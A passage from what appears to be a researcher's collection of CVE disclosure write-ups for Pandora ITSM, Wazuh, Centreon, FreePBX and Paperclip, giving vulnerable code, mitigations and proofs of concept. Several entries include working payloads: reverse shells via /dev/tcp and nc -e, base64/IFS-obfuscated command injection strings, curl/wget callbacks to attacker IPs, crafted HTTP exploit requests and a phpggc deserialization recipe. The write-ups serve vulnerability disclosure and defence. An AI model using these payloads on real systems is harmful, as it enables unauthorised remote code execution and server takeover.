                $config['homedir'] = str_replace("/", "\\", $$config['homedir']);
                $command_copy = sprintf ('xcopy ' . $config['homedir'] . 'attachment\* %s ', $attachmentsfile);
        }
        else {
                $command_copy = sprintf ('cp -r ' . $config['homedir'] . 'attachment/* %s ', $attachmentsfile);
        }
        $process = true;

        if ($sqlfile != "") {
                if ($config["dbpass"] == "") {
                        $command = sprintf ('mysqldump -h %s -u %s %s > %s ', $config['dbhost'], $config['dbuser'], $config['dbname'],$sqlfile);
                } else {
                        $command = sprintf ('mysqldump -h %s -u %s -p%s %s > %s ',$config['dbhost'], $config['dbuser'],$config['dbpass'], $config['dbname'],$sqlfile);
                }
                // this is where the actual RCE gets executed
                exec($command);
        }
        // this is where the actual RCE gets executed
        if ($attachmentsfile != "") {
                $result = exec($command_copy);
        }
// end vulnerable code section
```
**UPDATE 20 July 2025:** 
Submitted  a [Metasploit exploit module - PR 20399](https://github.com/rapid7/metasploit-framework/pull/20399).
 
### Mitigation
Please upgrade to version `5.0.106`.

### References
[CVE-2025-4653](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-4653)
[Security Advisory GHSA-m4f8-9c8x-8f3f](https://github.com/h00die-gr3y/h00die-gr3y/security/advisories/GHSA-m4f8-9c8x-8f3f)
[Pandora common Vulnerabilities and Exposures](https://pandorafms.com/en/security/common-vulnerabilities-and-exposures/)
[Metasploit module - Pandora ITSM auth RCE](https://github.com/rapid7/metasploit-framework/pull/20399)

### Credits
[h00die-gr3y](mailto:h00die.gr3y@gmail.com) -> Discovery 


---

## CVE-2025-24016
*Posted 2025-07-16 · last revised 2025-07-16*

> Wazuh is a free and open source platform used for threat prevention, detection, and response. Starting in version 4.4.0 and prior to version 4.9.1, an unsafe deserialization vulnerability allows for remote code execution on Wazuh servers. DistributedAPI parameters are a serialized as JSON and deserialized using `as_wazuh_object` (in `framework/wazuh/core/cluster/common.py`). If an attacker manages to inject an unsanitized dictionary in DAPI request/response, they can forge an unhandled exception (`__unhandled_exc__`) to evaluate arbitrary python code. The vulnerability can be triggered by anybody with API access (compromised dashboard or Wazuh servers in the cluster) or, in certain configurations, even by a compromised agent. Version 4.9.1 contains a fix.

An unsafe deserialization vulnerability allows for remote code execution on Wazuh servers.
The vulnerability can be triggered by anybody with API access to a compromised dashboard or Wazuh servers in the cluster.

This vulnerability can only be triggered in a Wazuh multi-node cluster configuration, because it needs the distributed API function.
The vulnerable code sits in the file `/var/ossec/framework/wazuh/core/cluster/common.py` at the function `as_wazuh_object`.
Line 1822 handles the `__unhandled_exec__` from a DAPI request and calls the unsafe `eval()` function which allows for remote code execution.

```python
1795 def as_wazuh_object(dct: Dict):
1796     try:
1797         if '__callable__' in dct:
1798             encoded_callable = dct['__callable__']
1799             funcname = encoded_callable['__name__']
1800             if '__wazuh__' in encoded_callable:
1801                 # Encoded Wazuh instance method.
1802                 wazuh = Wazuh()
1803                 return getattr(wazuh, funcname)
1804             else:
1805                 # Encoded function or static method.
1806                 qualname = encoded_callable['__qualname__'].split('.')
1807                 classname = qualname[0] if len(qualname) > 1 else None
1808                 module_path = encoded_callable['__module__']
1809                 module = import_module(module_path)
1810                 if classname is None:
1811                     return getattr(module, funcname)
1812                 else:
1813                     return getattr(getattr(module, classname), funcname)
1814         elif '__wazuh_exception__' in dct:
1815             wazuh_exception = dct['__wazuh_exception__']
1816             return getattr(exception, wazuh_exception['__class__']).from_dict(wazuh_exception['__object__'])
1817         elif '__wazuh_result__' in dct:
1818             wazuh_result = dct['__wazuh_result__']
1819             return getattr(wresults, wazuh_result['__class__']).decode_json(wazuh_result['__object__'])
1820         elif '__wazuh_datetime__' in dct:
1821             return datetime.datetime.fromisoformat(dct['__wazuh_datetime__'])
1822         elif '__unhandled_exc__' in dct:
1823             exc_data = dct['__unhandled_exc__']
1824             return eval(exc_data['__class__'])(*exc_data['__args__'])
1825         return dct
1826
1827     except (KeyError, AttributeError):
1828         raise exception.WazuhInternalError(1000,
1829                                            extra_message=f"Wazuh object cannot be decoded from JSON {dct}",
1830                                            cmd_error=True)
```
The vulnerability can be triggered by a distributed API request that allows to specify a `__unhandled_exc__` request in the body of the DAPI response.
A DAPI request that does not check the request body is the endpoint `/security/user/authenticate/run_as` implemented by `run_as_login` in `var/ossec/api/api/controllers/security_controller.py` where the `auth_context` argument is completely controlled by the attacker. By sending a malicious `run_as` request to a worker server, it is possible to execute code on the master server.

Below is an example which triggers the vulnerability using a `curl` based payload. You need to know the API credentials to execute this DAPI request.
`curl -X POST -k -u "wazuh-wui:MyS3cr37P450r.*-" -H "Content-Type: application/json" --data '{"__unhandled_exc__":{"__class__": "os.system", "__args__": ["curl http://<attacker_ip>"]}}' https://<worker-server>:55000/security/user/authenticate/run_as`

```bash
curl -X POST -k -u "wazuh-wui:MyS3cr37P450r.*-" -H "Content-Type: application/json" --data '{"__unhandled_exc__":{"__class__": "os.system", "__args__": ["curl http://192.168.201.10"]}}' https://localhost:56000/security/user/authenticate/run_as
{"data": {"token": "eyJhbGciOiJFUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ3YXp1aCIsImF1ZCI6IldhenVoIEFQSSBSRVNUIiwibmJmIjoxNzUyNjAwNzQ5LCJleHAiOjE3NTI2MDE2NDksInN1YiI6IndhenVoLXd1aSIsInJ1bl9hcyI6dHJ1ZSwicmJhY19yb2xlcyI6WzFdLCJyYmFjX21vZGUiOiJ3aGl0ZSIsImhhc2hfYXV0aF9jb250ZXh0IjoiYWYwNjM3ODY4NTRlZDZiMzQzNDYzZDQ4NDZjNDgwZDcifQ.ATNZjUkZImJPZkRO7Qv_ECazuECdm9JlUktqdZy4ygOOFDNBu46Fx7e5wPvEUFXro8xZbs6xP8hxYOyXwZQoMqFYAWQsEPOhzGTBmwy-R9vhLQhMtPzSV13k0SYgpyCuPZhH8-j7cazSB_jT9BlwlM9LbJ7Zbf3TrdUk0j8B3X18LbiY"}, "error": 0}%
```
```bash
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.201.85 - - [15/Jul/2025 17:32:29] "GET / HTTP/1.1" 200 -
```

I have submitted a [Metasploit module - PR 20387](https://github.com/rapid7/metasploit-framework/pull/20387) that will do all the hard work for you.
It is important to understand that the worker-server port (55000) should be exposed to the outside world in order to trigger this vulnerability.
Using it directly on the master-server port (55000) will not work because the DAPI request is not leveraged in this case, hence the vulnerable code will not be triggered.

### Mitigation
The vulnerability exists in version `4.4.0` and all versions prior to version `4.9.1`.
Please upgrade your Wazuh server to version `4.9.1` or higher.

### References
[CVE-2025-24016](https://www.cve.org/CVERecord?id=CVE-2025-24016)
[Wazuh security advisory - GHSA-hcrc-79hj-m3qh](https://github.com/wazuh/wazuh/security/advisories/GHSA-hcrc-79hj-m3qh)
[Metasploit - Wazuh Server authenticated RCE](https://github.com/rapid7/metasploit-framework/pull/20387)


### Credits
[DanielFi](https://github.com/DanielFi)  Discovery

---

## CVE-2025-4678
*Posted 2025-08-12 · last revised 2025-08-18*

> Improper Neutralization of Special Elements in the chromium_path variable may allow OS command injection. This issue affects Pandora ITSM 5.0.105.

This is a similar RCE like [CVE-2024-12971](https://attackerkb.com/topics/BJe14wkMYS/cve-2024-12971) but now in the `chromium_path` directory settings at the Pandora ITSM application. Pandora ITSM Enterprise Edition 5.0.105 and lower versions are vulnerable to an authenticated RCE.
The vulnerability is a RCE where the `chromium_path` variable is not properly escaped and can be controlled by the attacker to perform an RCE.
The attack can easily be executed as long as you have admin access to Pandora ITSM.

Here are the steps to reproduce:

1. Login as admin at Pandora ITSM
2. Goto the Setup->Setup
3. Update the “Chromium path”  field with one of the payloads below
4. Click the “Update” button.

The following payloads work but there should be no spaces in the payload, so we use base64 encoding and the IFS delimiter to avoid using spaces.
Please change the IP addresses to your range.

**Bash reverse shell:**
```shell
bash -i >& /dev/tcp/192.168.201.8/4444 0>&1
echo -n "bash -i >& /dev/tcp/192.168.201.8/4444 0>&1"|base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS44LzQ0NDQgMD4mMQ==
```
**payload:**
`;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS44LzQ0NDQgMD4mMQ==|base64${IFS}-d|bash;`

On attacker system run : `nc -lvnp 4444`

You can also do a simple test with a curl based payload.
**payload:**
`;curl${IFS}192.168.201.8;`

On attacker system run: `python3 -m http.server 80`

You can trigger the RCE by creating a report and export it to PDF.

The vulnerable code is located at `/var/www/html/pandoraitsm/include/functions.php` at line 3640 in function generator_chart_to_pdf().
This gets triggered if a chart is exported to PDF.
```php
// Begin vulnerable code section
    $chromium_dir = io_safe_output($config['chromium_path']);
    $result_ejecution = exec($chromium_dir.' --version');
    if (empty($result_ejecution) === true) {
        if ($params['return_img_base_64']) {
            $params['base64'] = true;
// End vulnerable code section
```
The vulnerable code is also located at `/var/www/html/pandoraitsm/include/lib/Modules/Shared/Services/PDF.php` at line 65 in function `generatePDF()`.
This gets triggered if a report is exported to PDF.
```php
// Begin vulnerable code section
  public function generatePDF(
    array $items,
    ?array $options = [],
    ?array $optionsPDF = null
  ) {
    global $config;

    // If not install chromium avoid 500 convert tu images no data to show.
    $chromium_dir = io_safe_output($config['chromium_path']);
    $result_ejecution = exec($chromium_dir.' --version');
    if (empty($result_ejecution) === true) {
      $message_error = __('chromium is not installed').', ';
      $message_error .= __('To be able to create images of the graphs for PDFs, please install the chromium extension. >
      $message_error .= '<a href="https://www.chromium.org/getting-involved/download-chromium/" target="_blank">';
      $message_error .= __('Info chromium');
      $message_error .= '</a>';
      throw new InvalidArgumentException($message_error);
      return;
    }
// End vulnerable code section
```
### Mitigation
Please upgrade to version 5.0.106.

### References
[CVE-2025-4678](https://www.cve.org/CVERecord?id=CVE-2025-4678)
[Security Advisory GHSA-wcqx-vw37-9pv8 ](https://github.com/h00die-gr3y/h00die-gr3y/security/advisories/GHSA-wcqx-vw37-9pv8)
[Pandora CVE overview](https://pandorafms.com/en/security/common-vulnerabilities-and-exposures/)


### Credits
[h00die.gr3y](h00die.gr3y@gmail.com) -> Discovery

---

## CVE-2025-5946
*Posted 2025-11-02 · last revised 2025-11-11*

> Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability in Centreon Infra Monitoring (Poller reload setup in the configuration modules) allows OS Command Injection. On the poller parameters page, a user with high privilege is able to concatenate custom instructions into the poller reload command.  This issue affects Infra Monitoring: from 24.10.0 before 24.10.13, from 24.04.0 before 24.04.18, from 23.10.0 before 23.10.28.

Centreon is a platform designed to monitor your cloud and on-premises infrastructure.
The platform has command injection vulnerability using the `broker engine reload` setting on the poller configuration page of the Centreon web application. Injecting a malcious payload at the `broker engine reload` parameter and restarting the poller, triggers this vulnerability.
You need have admin access at the Centreon Web application in order to execute this RCE.

### Demonstration
1. Download and install Centreon web application using one of supported [install methods](https://github.com/centreon/centreon).
2. When installed, login into Centreon web application (`http(s)://<your_ip>/centreon`) as `admin` user (default password: Centreon!123).
3. Goto Configuration->Pollers->Pollers
4. Open the Poller configuration by clicking on the first Poller line item.
![poller list](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2025-5946/centreon_poller_list.png)
5. Add a malicious payload at the `Centreon Broker reload command` parameter.
In this particular case, we will use a HTTP payload `wget http://<attacker_ip>` to test the remote code execution.
![poller configuration](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2025-5946/centreon_poller_configuration.png)
6. Start a `http` listener on your attacker machine.
 ```
 # python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
7. Trigger the vulnerability. You have several endpoints that you can use.
 a. by exporting the poller configuration.
 ![poller export](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2025-5946/centreon_poller_export.png)
 b. By going to Administration->Parameters->Data, select a data item by ticking the square box and select the action 'Delete Graph'
 ![data trigger](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2025-5946/centreon_data_trigger.png)
 c. By going to Administration->Parameters->Data, double click on a data item, a new screen appears with metric details, tick a metric item and select the action 'Delete Graph' 
![metric trigger](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2025-5946/centreon_metric_trigger.png)
8. Watch the incoming request on the listener ;-)
```
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.201.103 - - [01/Jun/2025 16:46:09] "GET / HTTP/1.1" 200 -
```
### Root cause
In the file `/usr/share/centreon/www/class/centreonBroker.class.php` at line 66, the `broker_reload_command` is not properly escaped on shell meta-characters which is used in at `shell_exec()` function to restart the broker engine.
```php
// Excerpt of the vulnerable code in /usr/share/centreon/www/class/centreonBroker.class.php
public function reload(): void
{
    if ($command = $this->getReloadCommand()) {
     // vulnerable code !!!   
     shell_exec("sudo $command");
    }
}

/**
 * Get command to reload centreon broker
 *
 * @return string|null the command
 * @throws PDOException
 */
private function getReloadCommand(): ?string
{
    $command = null;

    $result = $this->db->query(
        'SELECT broker_reload_command
        FROM nagios_server
        ORDER BY localhost DESC'
    );

if ($row = $result->fetch()) {
        $command = $row['broker_reload_command'];
    }

return $command;
}
```
This vulnerable `reload()` function gets triggered in the following code:

* `/usr/share/centreon/www/include/Administration/performance/viewData.php`, line 141 and 164.
* `/usr/share/centreon/www/include/Administration/performance/viewMetrics.php`, line 72 and;
* `/usr/share/centreon/www/include/configuration/configGenerate/xml/restartPollers.php`, line 205.

### Mitigation
All Centreon versions >= `19.10` are vulnerable for this attack.
It is fixed in Centreon Web versions `24.10.13`, `24.04.18` and `23.10.28` and subsequent releases.

### References
[CVE-2025-5946](https://www.cve.org/CVERecord?id=CVE-2025-5946)
[Centreon vulnerability disclosure](https://thewatch.centreon.com/latest-security-bulletins-64/cve-2025-5946-centreon-web-all-versions-high-severity-5104)
[Metasploit module](https://github.com/rapid7/metasploit-framework/pull/20672)

### Credits
Discovery -> <h00die.gr3y@gmail.com>


---

## CVE-2026-28209
*Posted 2026-03-13 · last revised 2026-03-13*

> FreePBX is an open source IP PBX. From versions 16.0.17.2 to before 16.0.20 and from version 17.0.2.4 to before 17.0.5, a command injection vulnerability exists in FreePBX when using the ElevenLabs Text-to-Speech (TTS) engine in the recordings module. This issue has been patched in versions 16.0.20 and 17.0.5.

A command injection vulnerability exists in FreePBX when using the ElevenLabs Text-to-Speech (TTS) engine. User-controlled input is passed unsanitized to a shell command executed via exec(), allowing authenticated attackers to achieve remote code execution (RCE) on the FreePBX server.
The vulnerability can be triggered via an AJAX endpoint in the System Recordings module and affects users with access to the recordings functionality.

**Affected Product**
* Product: FreePBX
* Module: System Recordings
* Driver: ElevenLabs TTS
* File:  `admin/modules/recordings/drivers/Elevenlabs.php`
* Function:  `convertToAudio()`

**Affected Versions**
* Confirmed on:
    * FreePBX 16 and 17
* Likely affects all versions where:
    * ElevenLabs TTS driver is present
    * `convertToAudio()` uses `exec()` without argument escaping

**Vulnerability Type**
* OS Command Injection
* CWE-78: Improper Neutralization of Special Elements used in an OS Command
* Leads to Remote Code Execution (RCE)

**Attack Vector**
Authenticated attacker with access to System Recordings module (including lower-privileged administrative users with module access).

### Root Cause
In `convertToAudio()`, user-controlled input `$file` is concatenated directly into a shell command without escaping:
```php
$command = "ffmpeg -y -i ".$amp_conf["ASTSPOOLDIR"]."/tmp/".$file.".MP3".
           " -acodec pcm_s16le -ac 1 -ar 44100 ".
           $amp_conf["ASTSPOOLDIR"]."/tmp/".$file.".wav 2>&1";
exec($command, $output, $returnCode);
```
The `$file` variable originates from the POST parameter `file_name` and is not sanitized or escaped, allowing shell meta-characters (e.g., back-ticks) to be injected and executed.

### Proof of Concept (PoC)
Payload (Base64-encoded to avoid file creation errors)
```bash
echo -n "touch /var/www/html/pawned" | base64
```
**Result:**
dG91Y2ggL3Zhci93d3cvaHRtbC9wYXduZWQ=

**Injected payload:**
```bash
echo${IFS}dG91Y2ggL3Zhci93d3cvaHRtbC9wYXduZWQ=|base64${IFS}-d|sh
```
**Exploit Request**
[1] First get an ElevenLabs API key (can be obtained from https://elevenlabs.io/app/developers/api-keys) after registration.
[2] Set the API key with the request below.
```http
GET /admin/ajax.php?module=recordings&command=setapikey&engine=Elevenlabs&key=sk_REDACTED HTTP/1.1
Host: <target>
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=<valid-session>
```
[3] Submit the exploit requests using a valid VoiceId that you can obtain from the response from the request above.
```http
POST /admin/ajax.php?module=recordings&command=ttsConvert HTTP/1.1
Host: <target>
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<valid-session>

engine=Elevenlabs&file_name=;`echo${IFS}dG91Y2ggL3Zhci93d3cvaHRtbC9wYXduZWQ=|base64${IFS}-d|sh`;&text=Cuckoo&voiceId=CwhRBWXzGAHq8TQ4Fs17&langCode=en
```
**Result:**
The command executes successfully and creates the file:
`/var/www/html/pawned`

This confirms arbitrary command execution on the FreePBX host.

**Preconditions**
* Valid FreePBX login
* Access to System Recordings module
* ElevenLabs API key configured (free tier sufficient)

**Impact**
* Remote Code Execution as the web server user (typically asterisk or www-data)
* Full compromise of the PBX system
* Potential lateral movement, call interception, credential theft

### Mitigation
FreePBX 16 (recordings) >= 16.0.17.2 && < 16.0.20 are vulnerable. Please upgrade to version `16.0.20`.
FreePBX 17 (recordings) >= 17.0.2.4 && < 17.0.5 are vulnerable. Please upgrade to version `17.0.5`.

### References
[CVE-2026-28209](https://www.cve.org/CVERecord?id=CVE-2026-28209)
[FreePBX vulnerability disclosure](https://github.com/FreePBX/security-reporting/security/advisories/GHSA-f558-mp87-58vj)

### Credits
Discovery -> <h00die.gr3y@gmail.com>

---

## CVE-2026-28287
*Posted 2026-03-14 · last revised 2026-03-14*

> FreePBX is an open source IP PBX. From versions 16.0.17.2 to before 16.0.20 and from version 17.0.2.4 to before 17.0.5, multiple command injection vulnerabilities exist in the recordings module. This issue has been patched in versions 16.0.20 and 17.0.5.

A command injection vulnerability exists in FreePBX.
User-controlled input is passed unsanitized to a shell command executed via `exec()`, allowing authenticated attackers to achieve remote code execution (RCE) on the FreePBX server. The vulnerability can be triggered via an AJAX endpoint in the System Recordings module and affects users with access to the recordings functionality.

**Affected Products**
* Product: FreePBX
* Module: System Recordings
* File:  `admin/modules/recordings/Recordings.class.php`
* Function:  `function fixeRIFF($filename)`

**Tested Versions**
* FreePBX 17.0.24
* FreePBX 17.0.25

**Vulnerability Type**
* OS Command Injection
* CWE-78: Improper Neutralization of Special Elements used in an OS Command
* Leads to Remote Code Execution (RCE)

**Attack Vector**
Authenticated attacker with access to System Recordings module (including lower-privileged administrative users with module access).

### Exploit Path
The FreePBX AJAX endpoint `/admin/ajax.php` exposes functionality from the **System Recordings** module.

Two AJAX commands are vulnerable:
`[1] module=recordings&command=gethtml5`
`[2] module=recordings&command=convert`

User-supplied POST parameters (e.g. `file`, `filenames[]`) are insufficiently sanitized and later passed into shell-executed operations via the Media handling subsystem. This allows command injection through crafted filename values..

**Impact:**
An attacker with access to the **System Recordings** module can:
* Execute arbitrary shell commands on the FreePBX server
* Write files to the web root
* Potentially escalate to full system compromise

This represents an escalation from module-level access to OS-level command execution.

### Proof of Concept (PoC)

**Endpoint 1 — `gethtml5`**
```http
POST /admin/ajax.php HTTP/1.1
Host: target
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<valid-session>

file=dummy.wav;`touch /var/www/html/pawned`&language=en&temporary[en]=0&filenames[en]=dummy.wav&command=gethtml5&module=recordings
```
**Result:**
File `/var/www/html/pawned` is created on the server.

**Endpoint 2 — `convert`**
```http
POST /admin/ajax.php HTTP/1.1
Host: target
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<valid-session>

file=dummy.wav;`touch /var/www/html/pawned`&name=dummy&codec=wav&lang=en&temporary=1&command=convert&module=recordings
```
**Result:**
File `/var/www/html/pawned` is created on the server.

### Root Cause
* Unsafe handling of user-controlled input used in file and media processing
* Command execution paths reachable via AJAX without sufficient sanitization
* Missing backend authorization enforcement for sensitive operations

The following code snippet shows the vulnerable code in file `admin/modules/recordings/Recordings.class.php`.
`$filename` is not sanitized and shell characters are not escaped.

```php
        public function fixeRIFF($filename){
                exec("file -b $filename | grep 'RIFF' ", $out, $ret);
                if($ret === 0 ){
                        dbug(_("An error is occured on RIFF detection."));
                }
                if(empty($out[0])){
                        if (isset($_POST["name"]) && str_starts_with($_POST["name"], "custom/")) {
                                $f = str_replace("custom/", "", $_POST["name"]);
                        } else {
                                $f = str_replace("custom/", "", $_POST["file"]);
                        }
                        $cmd    = "mv ".$this->temp."/$f.wav $filename";
                        exec($cmd, $out, $ret);
                }
        }
```
### Mitigation
FreePBX 16 (recordings) >= 16.0.17.2 && < 16.0.20 are vulnerable. Please upgrade to version `16.0.20`.
FreePBX 17 (recordings) >= 17.0.2.4 && < 17.0.5 are vulnerable. Please upgrade to version `17.0.5`.

### References
[CVE-2026-28287](https://www.cve.org/CVERecord?id=CVE-2026-28287)
[FreePBX vulnerability disclosure](https://github.com/FreePBX/security-reporting/security/advisories/GHSA-9vv6-h8v6-rp4q)

### Credits
Discovery -> <h00die.gr3y@gmail.com>


---

## CVE-2026-26978
*Posted 2026-05-24 · last revised 2026-06-03*

> FreePBX is an open source IP PBX. In versions below 16.0.71 and 17.0.6, the backup module does not properly sanitize data during restore operations, potentially leading to compromise if the backup contains carefully crafted hostile data. During backup restore operations, FreePBX extracts selected files from a user-supplied tar archive. If a malicious file exists in the archive, it is read and passed directly to unserialize() without validation, class restrictions, or integrity checks. This issue allows Remote Code Execution during restoration of the backup as the web server user (typically asterisk or www-data). The attack does not require shell access, CLI access, or filesystem write permissions beyond the normal restore workflow. Authentication with a known username that has sufficient access permissions and/or write access to backup files is required. This issue has been fixed in versions 16.0.71 and 17.0.6.

An authenticated remote code execution (RCE) vulnerability exists in the FreePBX Backup & Restore module due to unsafe use of PHP’s `unserialize()` function on attacker-controlled data contained within a backup archive.
A low-privileged authenticated user with backup/restore permissions can upload a crafted backup file containing a malicious `manifest` file, resulting in arbitrary code execution on the FreePBX server.

### Attack prerequisites
* Valid authenticated FreePBX user account
* Backup & Restore module enabled
* User has either:
  * Backup & Restore permission, **or**
  * Restore-only permission (restore-only role appears partially broken but still allows exploitation)

### Root cause
During backup restore operations, FreePBX extracts selected files from a user-supplied tar archive.
If a file named `manifest` exists in the archive, it is read and passed directly to `unserialize()` without validation, class restrictions, or integrity checks.

```php
if (file_exists($manafestfile)) {
    $manifestdata = file_get_contents($manafestfile);
    $tmpdata = unserialize($manifestdata);
    $meta = [
        'manifest' => $tmpdata
    ];
}
```
Because the archive contents are attacker-controlled, this enables **PHP Object Injection**, allowing gadget chains to achieve arbitrary code execution. Gadget chain tested: `monolog/rce7` but others are likely viable such as `swiftmailer/fw2`, `monolog/rce1`, `monolog/rce2`, `monolog/rce5`, `monolog/rce6` and `guzzle/fw1`.


### Proof of Concept (PoC)
[1] Generate Malicious Manifest
Using [phpggc](https://github.com/ambionics/phpggc) to generate a Monolog RCE payload:
```bash
phpggc monolog/rce7 exec "touch /var/www/html/pawned" -o manifest
```
[2] Create Malicious Backup Archive
```bash
tar -cvzf evil_backup.tar manifest
```
(Additional required backup files may be included if validation checks exist.)

[3] Upload and Restore Backup
* Login to FreePBX Admin UI
* Navigate to **Admin → Backup & Restore**
* Upload `evil_backup.tar.gz`
* Unsafe deserialization sink hit which results in an RCE

[4] Result
The file `/var/www/html/pawned` is created, confirming arbitrary command execution during the restore process.

This issue is conceptually similar to:
* **CVE-2014-7235** – FreePBX unsafe `unserialize()` leading to RCE
* Differs primarily in requiring authentication, but still results in full server compromise

### Mitigation
FreePBX 16 (backup) `< 16.0.71` are vulnerable. Please upgrade to version `16.0.71`.
FreePBX 17 (backup) `>= 17.0.0 < 17.0.6` are vulnerable. Please upgrade to version `17.0.6`.

### References
[CVE-2026-26978](https://www.cve.org/CVERecord?id=CVE-2026-26978)
[FreePBX vulnerability disclosure](https://github.com/FreePBX/security-reporting/security/advisories/GHSA-5v7h-49gr-jcwr)

### Credits
Discovery -> <h00die.gr3y@gmail.com>




---

## CVE-2026-41679
*Posted 2026-06-07 · last revised 2026-06-07*

> Paperclip is a Node.js server and React UI that orchestrates a team of AI agents to run a business. Prior to version 2026.416.0, an unauthenticated attacker can achieve full remote code execution on any network-accessible Paperclip instance running in `authenticated` mode with default configuration. No user interaction, no credentials, just the target's address. The chain consists of six API calls. The attack is fully automated, requires no user interaction, and works against the default deployment configuration. Version 2026.416.0 patches the issue.

Paperclip is an open-source platform for managing and coordinating teams of AI agents. 
In practical terms, Paperclip is a Node.js server with a web UI that lets you create an AI "company" consisting of multiple agents (CEO, CTO, developers, researchers, marketers, etc.), assign goals, track work, enforce budgets, and review decisions

This vulnerability, with a CVE rating of 10, allows an unauthenticated attacker to take over a Paperclip server with only six API calls.
The full chain is described in this [Github advisory](https://github.com/paperclipai/paperclip/security/advisories/GHSA-68qg-g8mg-6pr7).

I have submitted a Metasploit module that fully automates this attack.
There are around 700 Paperclip instances reported from a Shodan search so it is fortunately not very common in the Enterprise.
Please upgrade to `2026.410.0` or higher, preferable the latest release, to mitigate this vulnerability (NOTE: `2026.410.0` has already a fix).

### References
[CVE-2026-41679](https://www.cve.org/CVERecord?id=CVE-2026-41679)
[Paperclip vulnerability disclosure](https://github.com/paperclipai/paperclip/security/advisories/GHSA-68qg-g8mg-6pr7)
[Metasploit Module - Paperclip unauthenticated RCE](https://github.com/rapid7/metasploit-framework/pull/21547)

### Credits
Discovery -> [Sagi Layani](https://github.com/sagilayani) 


---

## CVE-2025-5965
*Posted 2026-06-17 · last revised 2026-06-17*

> In the backup parameters, a user with high privilege is able to concatenate custom instructions to the backup setup. Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability in Centreon Infra Monitoring (Backup configuration in the administration setup modules) allows OS Command Injection.This issue affects Infra Monitoring: from 25.10.0 before 25.10.2, from 24.10.0 before 24.10.15, from 24.04.0 before 24.04.19.

Well, it took a while for the vendor to fix this one. But today, I received the notification that the vulnerability report on their side was finally closed.
So here are the details for this CVE which boils down to a traditional RCE ;-)

Centreon is a platform designed to monitor your cloud and on-premises infrastructure.
The platform has multiple command injection vulnerability using the temporary directory and scp settings on the backup configuration page of the Centreon web application.
Injecting a malicious payload at the backup temp directory or scp parameters will trigger this vulnerability when the backup is enabled and is executed by the cron daemon at 03:30 AM.
You need to have admin access at the Centreon Web application in order to execute this RCE.

### Demonstration
**[1]** Download and install Centreon web application using one of supported [install](https://github.com/centreon/centreon) methods.
**[2]** When installed, login into Centreon web application (http(s)://<your_ip>/centreon) as admin user (default password: Centreon!123).
**[3]** Goto Administration->Parameters->Backup
**[4]** Add a malicious payload at the `Temporary directory` parameter. You can also use the scp parameters `Remote user`, `Remote host` or `Remote directory`.
You should set SCP export enabled to make this work.
In this particular case, we will use a `netcat` payload `;nc <attacker_ip> <port> -e /bin/sh;` to test the remote code execution.
You can also use an HTTP payload using `wget` or `curl` (wget http://<attacker_ip>:<port>) if `netcat` is not installed.
![backup](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2025-5965/centreon_backup_configuration.png)

**[5]** Start a nc listener on your attacker machine.
```bash
# nc -lvnp 4444
Listening on 0.0.0.0 4444
```
**[6]** Wait until the cron backup job kicks in at 03:30 AM to trigger the vulnerability.
```bash
##########################
# Cron for Centreon-Backup
30 3 * * * root /usr/share/centreon/cron/centreon-backup.pl >> /var/log/centreon/centreon-backup.log 2>&1
```
You can also run the perl script `/usr/share/centreon/cron/centreon-backup.pl` directly if you are in a hurry ;-).

**[7]** Watch the incoming request on the listener ;-)
```bash
# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.201.6 46122
id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
pwd
/usr/share/centreon
```
### Root cause
In the file `/usr/share/centreon/cron/centreon-backup.pl` the `$TEMP_DB_DIR` and scp parameters `$scp_user`, `$scp_host` and `$scp_directory` are not properly escaped on shell meta-characters which are used in `centreon-backup-mysql.sh`, `sqldump` and `scp` commands.
```pl
// Excerpt of the vulnerable code using the vulnerable `$TEMP_DB_DIR` parameter
sub databasesBackup() {
 my ($sec, $min, $hour, $mday, $mon, $year, $wday, $yday, $isdst) = localtime(time);
 my $today = sprintf("%d-%02d-%02d", (1900 + $year), ($mon + 1), $mday);

 print "[" . sprintf("%4d-%02d-%02d %02d:%02d:%02d", (1900 + $year), ($mon + 1), $mday, $hour, $min, $sec) . "] Start database backup process\n";

 # Create path
 mkpath($TEMP_DB_DIR, { mode => 0755, error => \my $err_list });
 if (@$err_list) {
     for my $diag (@$err_list) {
         my ($file, $message) = %$diag;
         if ($file eq '') {
             print STDERR "Database BACKUP: Unable to create temporary directories because: " . $message . "\n";
         } else {
             print STDERR "Database BACKUP: Problem with file  " . $file . ": " . $message . "\n";
         }
     }
 }

 my @localtime = localtime(time);
 my $dayOfWeek = @localtime[6];
 my @fullBackupDays = split(/,/, $BACKUP_DATABASE_FULL);
 if ($BACKUP_DATABASE_TYPE == '1') {
     # Do LVM snapshot backup or fall into degraded mode with mysqldump

     if (grep $_ == $dayOfWeek, @fullBackupDays) {
         print "Dumping Db with LVM snapshot (full)\n";
         `$CENTREONDIR/cron/centreon-backup-mysql.sh -b $TEMP_DB_DIR -d $today`;
         if ($? ne 0) {
